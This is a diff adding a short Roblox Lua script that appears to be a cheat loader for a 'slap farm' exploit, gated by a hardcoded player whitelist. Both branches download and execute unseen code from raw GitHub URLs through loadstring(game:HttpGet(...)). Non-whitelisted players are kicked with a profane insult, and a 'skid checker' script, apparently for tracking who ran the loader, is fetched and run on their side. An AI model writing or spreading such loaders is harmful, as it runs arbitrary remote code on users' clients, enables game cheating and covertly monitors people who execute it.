@@ -1,0 +1,15 @@
+local WhitelistedPlayers = {
+    "AHHS3FTXY",
+    "Player2",
+    "Player3"
+}
+
+local player = game.Players.LocalPlayer
+if table.find(WhitelistedPlayers, player.Name) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/HWIDSlapFarmHolder/refs/heads/main/ScriptHolder"))()
+else
+    
+
+game.Players.LocalPlayer:Kick("Unauthorized access. Don't try skidding again, MF.")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/WhoExecutedHolder/refs/heads/main/GatosSkidChecker"))()
+end
